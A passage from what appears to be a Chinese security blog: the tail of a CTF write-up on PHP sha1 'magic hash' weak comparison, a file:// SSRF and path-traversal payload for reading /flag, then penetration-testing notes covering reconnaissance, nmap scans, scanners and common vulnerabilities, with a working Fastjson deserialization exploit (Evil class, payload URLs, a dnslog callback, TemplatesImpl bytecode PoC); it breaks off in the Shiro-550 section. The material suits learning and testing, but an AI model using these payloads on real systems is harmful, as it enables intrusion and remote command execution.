          <a href="#why-are-types-weird" class="heading-link"><i class="fas fa-link"></i></a><a href="#why-are-types-weird" class="headerlink" title="why-are-types-weird"></a>why-are-types-weird</h2>
      <p>写一半，dirsearch之后显示源码</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;but_submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;txt_uname&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;txt_pwd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> !== <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Invalid username&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (hash(<span class="string">&#x27;sha1&#x27;</span>, <span class="variable">$password</span>) == <span class="string">&quot;0&quot;</span>) &#123;</span><br><span class="line">        session_start();</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">        header(<span class="string">&quot;Location: admin.php&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Invalid password&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>存在”0”的弱比较，参考：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/spaze/hashes" >spaze/hashes: Magic hashes – PHP hash “collisions” (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230806194845949.png" alt="image-20230806194845949"></p>
<p>其中提供sha1的弱比较sha字符串，即可登录。</p>

        <h1 id="WEB小技巧"   >
          <a href="#WEB小技巧" class="heading-link"><i class="fas fa-link"></i></a><a href="#WEB小技巧" class="headerlink" title="WEB小技巧"></a>WEB小技巧</h1>
      <p>Imagefile?url1=file:///%25%36%36%25%36%63%25%36%31%25%36%37%23java</p>
<p>/admin/..//..//..//..//..//..//..//flag</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/08/14/%E6%B8%97%E9%80%8F/">渗透测试</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-09-11</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="前置知识"   >
          <a href="#前置知识" class="heading-link"><i class="fas fa-link"></i></a><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1>
      
        <h2 id="一、信息搜集"   >
          <a href="#一、信息搜集" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h2>
      
        <h3 id="1-子域名"   >
          <a href="#1-子域名" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-子域名" class="headerlink" title="1.子域名"></a>1.子域名</h3>
      <ul>
<li><p>google hacking</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">site:baidu.com</span><br><span class="line">inurl:php?id=1</span><br></pre></td></tr></table></div></figure></li>
<li><p>三方网站查询</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://dnsdumpster.com</span><br><span class="line">http://tool.chinaz.com/subdomain</span><br><span class="line">FOFA</span><br></pre></td></tr></table></div></figure></li>
<li><p>SSL证书查询</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://crt.sh/</span><br></pre></td></tr></table></div></figure></li>
<li><p>JS文件发现子域名</p>
<p>安装一下，可以使用，原理就是网站源代码下保存的各种子域名</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Threezh1/JSFinder</span><br></pre></td></tr></table></div></figure></li>
<li><p>子域名爆破工具：……</p>
<p>或者在线工具</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/lijiejie/subDomainsBrute</span><br></pre></td></tr></table></div></figure></li>
<li><p><strong>OneForAll</strong>：安装使用，设置API很好用</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/shmilylty/OneForAll</span><br></pre></td></tr></table></div></figure></li>
</ul>

        <h3 id="2-IP搜集"   >
          <a href="#2-IP搜集" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-IP搜集" class="headerlink" title="2.IP搜集"></a>2.IP搜集</h3>
      <p>有的服务开启了CDN之后，真实的服务器在北京，可是福建也存在它的服务备份，所以当我们从福建进行域名访问时，其访问到的IP就可能是在福建的IP，而不是其在北京的真实服务区的IP。所以有的时候需要绕过。</p>
<ul>
<li><p>多地Ping</p>
<p>挑选最多的IP从而判断真实IP</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://ping.chinaz.com</span><br><span class="line">http://www.webkaka.com/Ping.aspx</span><br></pre></td></tr></table></div></figure></li>
<li><p>国外服务区Ping</p>
<p>CDN由于昂贵，一般不对国外的服务提供CDN服务，所以使用国外服务区进行Ping一般可以找到真实IP。</p>
</li>
<li><p>查看子域名的IP，通过Ping子域名查看</p>
</li>
<li><p>查询历史DNS记录</p>
<p>由于最开始建设网站没有CDN的时候域名对应真实IP，所以拿到最开始那一段时间的可以看到真实IP</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://dnsdb.io/zh-cn</span><br><span class="line">https://securitytrails.com</span><br><span class="line">https://x.threatbook.cn/</span><br></pre></td></tr></table></div></figure></li>
</ul>

        <h3 id="3-C段存活主机探测"   >
          <a href="#3-C段存活主机探测" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-C段存活主机探测" class="headerlink" title="3.C段存活主机探测"></a>3.C段存活主机探测</h3>
      <ul>
<li><p>nmap工具</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP www.xxx.com/24</span><br><span class="line">nmap -sP 192.168.1.*</span><br></pre></td></tr></table></div></figure></li>
<li><p>其他工具：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/se55i0n/Cwebscanner</span><br></pre></td></tr></table></div></figure></li>
<li><p>常用命令</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn -v -T4 -oG Discover.gnmap 172.26.1.0/24     <span class="comment">#主机探测</span></span><br><span class="line">grep <span class="string">&quot;Status: Up&quot;</span> Discover.gnmap | cut -f 2 -d <span class="string">&#x27;&#x27;</span> &gt; LiveHosts.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#端口扫描</span></span><br><span class="line">nmap -sS -T4 -Pn -oG TopTCP -iL LiveHosts.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#系统扫描</span></span><br><span class="line">nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#版本检测</span></span><br><span class="line">nmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt</span><br></pre></td></tr></table></div></figure></li>
</ul>

        <h3 id="4-其他信息搜集"   >
          <a href="#4-其他信息搜集" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-其他信息搜集" class="headerlink" title="4.其他信息搜集"></a>4.其他信息搜集</h3>
      <ul>
<li><p>历史漏洞信息</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://wy.zone.ci/</span><br><span class="line">https://wooyun.kieran.top/#!/</span><br><span class="line"></span><br><span class="line">https://www.exploit-db.com/ 	#漏洞查找</span><br><span class="line"></span><br><span class="line">https://wiki.0-sec.org/#/md</span><br><span class="line"></span><br><span class="line">https://www.seebug.org/</span><br></pre></td></tr></table></div></figure></li>
</ul>

        <h2 id="二、网站信息搜集"   >
          <a href="#二、网站信息搜集" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、网站信息搜集" class="headerlink" title="二、网站信息搜集"></a>二、网站信息搜集</h2>
      
        <h3 id="1-网站指纹识别"   >
          <a href="#1-网站指纹识别" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-网站指纹识别" class="headerlink" title="1.网站指纹识别"></a>1.网站指纹识别</h3>
      <ul>
<li><p>操作系统</p>
<ul>
<li><p>ping：</p>
<p>windows的TTL值一般为128，Linux则为64。TTL大于100一般为windows，几十一般为linux。</p>
</li>
<li><p>nmap -O扫描</p>
</li>
<li><p>windows大小写不敏感，Linux则很区分大小写</p>
</li>
</ul>
</li>
<li><p>中间件</p>
<ul>
<li><p>F12响应头Server字段</p>
</li>
<li><p>whatweb：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.whatweb.net/</span><br></pre></td></tr></table></div></figure></li>
<li><p>wappalyzer浏览器插件</p>
</li>
</ul>
</li>
<li><p>语言识别</p>
<ul>
<li>PHP、ASP等等</li>
<li>数据库类型等</li>
</ul>
</li>
<li><p>CMS识别：</p>
<p>内容管理系统，用于网站内容文章管理，常见有dedecms、Discuz、phpcms等</p>
<ul>
<li><p>识别工具：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://whatweb.bugscaner.com/look/</span><br><span class="line">https://github.com/iceyhexman/onlinetools</span><br></pre></td></tr></table></div></figure></li>
</ul>
</li>
</ul>

        <h3 id="2-敏感文件、目录探测"   >
          <a href="#2-敏感文件、目录探测" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-敏感文件、目录探测" class="headerlink" title="2.敏感文件、目录探测"></a>2.敏感文件、目录探测</h3>
      <p>常见有</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">github 			#直接github上搜索该网站</span><br><span class="line">.git			#GitHack自动化利用,原理是本地和远程相互备份了</span><br><span class="line">.svn</span><br><span class="line">.DS_Store  #苹果操作系统的文件</span><br><span class="line">.hg</span><br><span class="line">.bzr</span><br><span class="line">cvs</span><br><span class="line"></span><br><span class="line">WEB-INF			</span><br><span class="line">#是JAVA的WEB应用的安全目录,如果想要在页面中直接访问其中的文件,必须要通过web.xml文件对要访问的文件进行相应的映射才能访问。</span><br><span class="line"></span><br><span class="line">www.zip</span><br></pre></td></tr></table></div></figure>

<ul>
<li><p>工具</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dirsearch</span><br><span class="line">御剑</span><br><span class="line">https://github.com/H4ckForJob/dirmap</span><br></pre></td></tr></table></div></figure></li>
<li><p>针对漏洞的信息泄露</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/LandGrey/SpringBootVulExploit</span><br><span class="line">https://github.com/rabbitmask/SB-Actuator</span><br></pre></td></tr></table></div></figure></li>
</ul>

        <h3 id="3-网站WAF识别"   >
          <a href="#3-网站WAF识别" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-网站WAF识别" class="headerlink" title="3.网站WAF识别"></a>3.网站WAF识别</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/EnableSecurity/wafw00f</span><br><span class="line">nmap -p80,443 --script http-waf-detect ip</span><br><span class="line">nmap -p80,443 --script http-waf-fingerprint ip</span><br></pre></td></tr></table></div></figure>




        <h2 id="三、漏洞扫描"   >
          <a href="#三、漏洞扫描" class="heading-link"><i class="fas fa-link"></i></a><a href="#三、漏洞扫描" class="headerlink" title="三、漏洞扫描"></a>三、漏洞扫描</h2>
      
        <h3 id="1-针对性漏洞"   >
          <a href="#1-针对性漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-针对性漏洞" class="headerlink" title="1.针对性漏洞"></a>1.针对性漏洞</h3>
      <ul>
<li><p>SQL：sqlmap</p>
</li>
<li><p>weblogic：weblogicscan</p>
</li>
<li><p>CMS</p>
<ul>
<li>wordpress：wpscan</li>
<li>dedecms：dedecmsscan</li>
</ul>
</li>
<li><p>应用层：nessus</p>
</li>
<li><p>某类框架：Struts2(Struts2漏洞检测工具)、sprintboot(SB-Actuator)</p>
</li>
<li><p>web服务：xray、awvs</p>
</li>
</ul>

        <h3 id="2-awvs"   >
          <a href="#2-awvs" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-awvs" class="headerlink" title="2.awvs"></a>2.awvs</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221113110028639.png" alt="image-20221113110028639"></p>

        <h2 id="四、常见漏洞"   >
          <a href="#四、常见漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#四、常见漏洞" class="headerlink" title="四、常见漏洞"></a>四、常见漏洞</h2>
      
        <h3 id="1-weblogic"   >
          <a href="#1-weblogic" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-weblogic" class="headerlink" title="1.weblogic"></a>1.weblogic</h3>
      <ul>
<li><p>端口：7001</p>
</li>
<li><p>Web界面特征：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221113111840633.png" alt="image-20221113111840633"></p>
</li>
</ul>

        <h3 id="2-Thinkphp5"   >
          <a href="#2-Thinkphp5" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-Thinkphp5" class="headerlink" title="2.Thinkphp5"></a>2.Thinkphp5</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/admintony/thinkPHPBatchPoc</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-Struts2"   >
          <a href="#3-Struts2" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-Struts2" class="headerlink" title="3.Struts2"></a>3.Struts2</h3>
      <ul>
<li><p>框架识别：</p>
<ul>
<li><code>.do</code>或者<code>.action</code>后缀</li>
<li><code>/struts/webconsole.html</code>界面：需要开启<code>devMode</code></li>
</ul>
</li>
<li><p>工具：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/HatBoy/Struts2-Scan</span><br></pre></td></tr></table></div></figure></li>
<li><p>常见漏洞：</p>
<ul>
<li><p>struts2-045：CVE-2017-5638，可代码执行，版本在2.3.5<del>2.3.31和2.5</del>2.5.10</p>
<p>在使用基于Jakarta插件的文件上传功能时，可能存在远程命令执行。</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/85674" >https://www.anquanke.com/post/id/85674</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</li>
</ul>
</li>
</ul>

        <h3 id="4-Jboss"   >
          <a href="#4-Jboss" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-Jboss" class="headerlink" title="4.Jboss"></a>4.Jboss</h3>
      <p>JAVA EE应用服务器，通常与Tomcat或jetty绑定使用</p>
<ul>
<li><p>框架识别：</p>
<ul>
<li><p>8080端口：6…版本</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221113115127399.png" alt="image-20221113115127399"></p>
</li>
<li><p>1741端口：7…版本</p>
</li>
</ul>
</li>
<li><p>工具：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/GGyao/jbossScan</span><br></pre></td></tr></table></div></figure></li>
<li><p>常见漏洞：</p>
<ul>
<li><p>CVE-2017-12149</p>
<p>JAVA反序列化错误，在过滤器没有进行检查。</p>
<p>访问<code>/invoker/readonly</code>显示500可能存在</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221113115659179.png" alt="image-20221113115659179"></p>
<p>可使用如下工具进行反弹shell</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/joaomatosf/jexboss</span><br></pre></td></tr></table></div></figure></li>
</ul>
</li>
</ul>

        <h3 id="5-Fastjson"   >
          <a href="#5-Fastjson" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-Fastjson" class="headerlink" title="5.Fastjson"></a>5.Fastjson</h3>
      <ul>
<li><p>识别：</p>
<ul>
<li>出现json格式的地方就又可能使用了fastjson（<code>Content-type:application/json</code>）</li>
</ul>
</li>
<li><p>原理：</p>
<p>在<code>FastJson</code> 中有一个<code>@type</code> 参数，能将我们反序列化后的类转为<code>@type</code> 中指定的类，然后在反序列化过程中会自动调用类中的<code>setter</code>， <code>getter</code> 和构造器，参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.yuque.com/tianxiadamutou/zcfd4v/rwx6sb" >FastJason 1.2.22-1.2.24 TemplatesImpl利用链分析 (yuque.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>使用<code>springboot</code>时如下</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/fast&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">FastVuln1</span><span class="params">(<span class="meta">@RequestParam(name=&quot;evil&quot;)</span> String evil)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    Object obj = JSON.parseObject(evil,Object.class, Feature.SupportNonPublicField);</span><br><span class="line">    System.out.println(obj.getClass().getName());</span><br><span class="line">    <span class="keyword">return</span> evil;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>相关<code>Evil</code>类</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.fastjsondemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String cmd;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Evil</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCmd</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.cmd = cmd;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="keyword">this</span>.cmd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getCmd</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.cmd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Evil&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;cmd=&#x27;&quot;</span> + cmd + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>对应的<code>payload</code>为，记得<code>url</code>编码一下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080/fast?evil=&#123;&quot;@type&quot;:&quot;com.example.fastjsondemo.Evil&quot;,&quot;cmd&quot;:&quot;touch ccc&quot;&#125;</span><br></pre></td></tr></table></div></figure>

<p>或者利用一下<code>dnslog</code></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080/fast?evil=&#123;&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;je85rk.dnslog.cn&quot;&#125;</span><br></pre></td></tr></table></div></figure>

<p>结合<code>JAVA</code>反序列化的知识，得到<code>POC</code></p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.fastjsondemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Transformer;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.time.temporal.Temporal;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">generateEvil</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass clas = pool.makeClass(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet.class));</span><br><span class="line">        String cmd = <span class="string">&quot;Runtime.getRuntime().exec(\&quot;touch dddd\&quot;);&quot;</span>;</span><br><span class="line">        clas.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        clas.setSuperclass(pool.getCtClass(AbstractTranslet.class.getName()));</span><br><span class="line"></span><br><span class="line">        clas.writeFile(<span class="string">&quot;./&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] bytes = clas.toBytecode();</span><br><span class="line">        String EvilCode = Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">        <span class="comment">//System.out.println(EvilCode);</span></span><br><span class="line">        <span class="keyword">return</span> EvilCode;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> String GADGAT_CLASS = <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        String evil = poc.generateEvil();</span><br><span class="line">        String PoC = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + GADGAT_CLASS + <span class="string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span> + evil + <span class="string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;a.b&#x27;,&#x27;_tfactory&#x27;:&#123;&#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot;</span> + <span class="string">&quot;\&quot;_name\&quot;:\&quot;a\&quot;,\&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;\n&quot;</span>;</span><br><span class="line">        System.out.println(PoC);</span><br><span class="line">        JSON.parseObject(PoC,Object.class, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></li>
</ul>

        <h3 id="6-shiro"   >
          <a href="#6-shiro" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-shiro" class="headerlink" title="6.shiro"></a>6.shiro</h3>
      <p>环境搭建：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46127592/article/details/123999749" >(47条消息) shiro debug 调试_scanner010的博客-CSDN博客</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>其它参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.yuque.com/tianxiadamutou/zcfd4v/op3c7v#e9db1d2a" >Shiro 550 漏洞学习（一） (yuque.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://wx.zsxq.com/dweb2/index/topic_detail/582525812214224" >P神知识星球的TemplatesImpl在Shiro中的利用</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<ul>
<li><p><code>Shiro-550</code>原理：</p>
<p><code>1.2.4</code>及以下</p>
<p><code>Apache Shiro</code>框架提供了记住密码功能，登录成功的化会生成经过加密并且编码的<code>Cookie</code>，实际为<code>rememberMe</code>。那么在服务端就会对该<code>Cookie</code>进行<code>base64</code>解码，然后<code>AES</code>解密，最后再反序列化，这样就会导致反序列化的<code>RCE</code>漏洞，而其中<code>AES</code>加解密的<code>KEY</code>是硬编码写在源码中的。</p>
